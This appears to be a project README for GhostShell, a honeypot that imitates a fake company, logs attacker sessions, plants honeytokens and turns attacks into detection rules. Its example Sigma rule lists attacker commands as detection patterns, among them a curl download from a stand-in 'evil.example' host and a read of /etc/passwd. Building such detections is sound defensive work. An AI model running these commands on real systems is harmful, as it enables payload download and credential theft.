<div align="center">

<h1><span style="color:#22c55e">GhostShell</span></h1>

<h3><span style="color:#94a3b8">AI-Driven Deception Platform</span></h3>

<p><b>Trick attackers. Profile them. Turn their attacks into defence.</b></p>

[![Python](https://img.shields.io/badge/Python-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
[![License](https://img.shields.io/badge/License-MIT-22c55e?style=for-the-badge)](LICENSE)
[![Status](https://img.shields.io/badge/Status-Working_v1.0-22c55e?style=for-the-badge)]()
[![Made by](https://img.shields.io/badge/Made_by-zer0k7-111827?style=for-the-badge)](https://github.com/zer0k7)

<p><i>A normal honeypot logs logins and dies when an attacker types an unusual command.</i></p>
<p><i>GhostShell is the whole fake company — and it fights back.</i></p>

<p><b>Docs:</b> <a href="docs/USAGE.md">Usage Guide</a> &nbsp;·&nbsp; <a href="docs/ARCHITECTURE.md">Architecture</a></p>

</div>

---

<h2><span style="color:#22c55e">What makes it different</span></h2>

| Normal honeypot | <span style="color:#22c55e"><b>GhostShell</b></span> |
|---|---|
| Logs SSH logins | Logs SSH **+ fake admin panel + fake AWS metadata** — one fake company |
| Scripted shell, breaks on weird commands | **AI fake shell** (local Ollama) answers *any* command like real Linux |
| Just an IP in a log | **Attacker profile**: bot vs human, skill level, intent |
| No context | Auto-mapped to **MITRE ATT&CK** tactics and techniques |
| Watching only | **Honeytokens** — fake AWS keys, `id_rsa`, DB backups that phone home |
| Data dies in a log file | Auto-generates **Sigma + Suricata rules + IOC feed** from real attacks |

---

<h2><span style="color:#3b82f6">Architecture</span></h2>

![GhostShell Architecture](docs/architecture.svg)

<table>
<tr>
<td><b><span style="color:#ef4444">Attacker</span></b><br/>any password works</td>
<td><b><span style="color:#3b82f6">SSH Honeypot :2222</span></b><br/>Paramiko server</td>
<td><b><span style="color:#a855f7">Fake Admin Panel :8081</span></b><br/>Acme Corp portal</td>
<td><b><span style="color:#f59e0b">Fake AWS Metadata</span></b><br/>same fake AWS key</td>
</tr>
<tr>
<td><b><span style="color:#22c55e">Fake Shell + Filesystem</span></b><br/>AI shell + honeytokens</td>
<td><b><span style="color:#94a3b8">SQLite Database</span></b><br/>sessions, commands, hits</td>
<td><b><span style="color:#14b8a6">Profiler + Rules</span></b><br/>MITRE, Sigma, Suricata</td>
<td><b><span style="color:#3b82f6">Live Dashboard :5000</span></b><br/>stats, replay, IOC feed</td>
</tr>
</table>

---

<h2><span style="color:#f59e0b">Quick start</span></h2>

```bash
git clone https://github.com/zer0k7/GhostShell.git
cd GhostShell

python3 -m venv .venv
.venv/bin/pip install -r requirements.txt
.venv/bin/python run.py
```

| Service | URL | What it is |
|---|---|---|
| SSH honeypot | `ssh admin@localhost -p 2222` | Any password works — it is a trap |
| Fake admin panel | http://localhost:8081 | Fake Acme Corp portal, any login works |
| Live dashboard | http://localhost:5000 | Stats, session replay, MITRE, rules, IOC feed |

Try it like an attacker:

```bash
ssh admin@localhost -p 2222   # password: anything, e.g. hunter123
ls
cat aws_credentials.txt       # honeytoken — this hit is logged
ps aux
uname -a
```

Then open http://localhost:5000 — your session is there, replayable like a terminal recording.

> **Optional — AI shell:** install [Ollama](https://ollama.com) and run `ollama pull llama3.2:1b`.
> GhostShell will use it to answer unusual commands. If Ollama is not running,
> the rule-based fake shell takes over — nothing breaks.

---

<h2><span style="color:#a855f7">Dashboard — what you see</span></h2>

- **Stats cards** — attacker sessions, commands captured, honeytoken hits, unique IPs
- **Sessions table** — IP, credentials tried, profile badge (bot / intermediate / skilled)
- **Terminal replay** — every command + response, exactly as the attacker saw it
- **MITRE profile** — tactics and techniques per session, with a skill score
- **Detection rules** — one click generates a Sigma rule + Suricata rule from that session
- **IOC feed** — `GET /api/ioc` returns attacker IPs + honeytoken hits as JSON

### Example — auto-generated Sigma rule

```yaml
title: GhostShell — suspicious activity from honeypot attacker 185.220.x.x
status: experimental
logsource:
    product: linux
    service: sshd
detection:
    selection:
        src_ip: '185.220.x.x'
        CommandLine|contains:
            - "cat /etc/passwd"
            - "curl http://evil.example/x.sh"
    condition: selection
level: high
```

---

<h2><span style="color:#14b8a6">Project layout</span></h2>

```
GhostShell/
├── run.py                    # starts everything: SSH + fake panel + dashboard
├── config.yaml               # ports, fake hostname, Ollama settings
├── requirements.txt
├── LICENSE
├── docs/
│   ├── USAGE.md              # 5-minute usage guide
│   ├── ARCHITECTURE.md       # architecture, data flow, honeytokens
│   └── architecture.svg      # coloured architecture diagram
├── ghostshell/
│   ├── honeypot.py           # Paramiko SSH server — accepts ANY password
│   ├── shell.py              # fake shell: ls / cat / ps / whoami / ... + AI fallback
│   ├── fakefs.py             # the fake filesystem, incl. honeytoken files
│   ├── llm.py                # local Ollama AI shell (falls back to rules)
│   ├── services.py           # fake admin panel + fake AWS metadata endpoint
│   ├── db.py                 # SQLite: sessions, commands, honeytoken hits
│   ├── profiler.py           # MITRE ATT&CK mapping + skill scoring
│   ├── rules.py              # Sigma / Suricata generation from attacks
│   └── dashboard.py          # rich HTML dashboard + replay + IOC feed
└── data/
    └── ghostshell.db          # created on first run (gitignored)
```

---

<h2><span style="color:#ef4444">Why this matters for jobs</span></h2>

| Role | What GhostShell proves |
|---|---|
| **SOC Analyst** | You built detections from real attacks, not textbook rules |
| **Pen Tester / Red Team** | You think like an attacker — and like the defender catching them |
| **Security Engineer** | Honeypots, deception, MITRE ATT&CK, Sigma/Suricata, Python, Linux |
| **Threat Intel** | IOC feeds, attacker profiling, TTP extraction |

**Resume line:**

> *Built GhostShell, an AI-driven deception platform that profiles live attackers,
> maps them to MITRE ATT&CK, and auto-generates Sigma detection rules from real attacks.*

---

<h2><span style="color:#f59e0b">Safety — read this</span></h2>

GhostShell is a **defensive research tool** for your own lab only.

- Run it only on your own machine / VM, on localhost or a lab network.
- Never expose ports 2222 / 5000 / 8081 to the public internet.
- Never point it at real systems, real credentials, or real people.
- All secrets in the fake filesystem are **fake** (`FAKEKEY`, `fakehash`) — never use real keys here.

---

<h2><span style="color:#22c55e">Roadmap — all built today</span></h2>

- [x] Core SSH honeypot + fake shell + fake filesystem
- [x] Session + command logging (SQLite)
- [x] Rich HTML dashboard — stats, replay, MITRE, rules, IOC feed
- [x] Fake admin panel + fake AWS metadata endpoint
- [x] Honeytokens (AWS keys, SSH key, DB backup)
- [x] Attacker profiler — MITRE ATT&CK + skill score
- [x] Auto Sigma / Suricata rules + IOC feed
- [x] AI shell via local Ollama (with rule-based fallback)
- [ ] Deploy on a cheap VPS + collect real internet attacks *(your call — lab only for now)*
- [ ] GeoIP map of attacker IPs
- [ ] Auto-blocklist push to firewall

---

<div align="center">

<p><b>Built by <a href="https://github.com/zer0k7">Salik Seraj Naik</a> — zer0k7</b></p>
<p><i>BTech CSE · Red Team / Offensive Security · TryHackMe Top 1%</i></p>

</div>
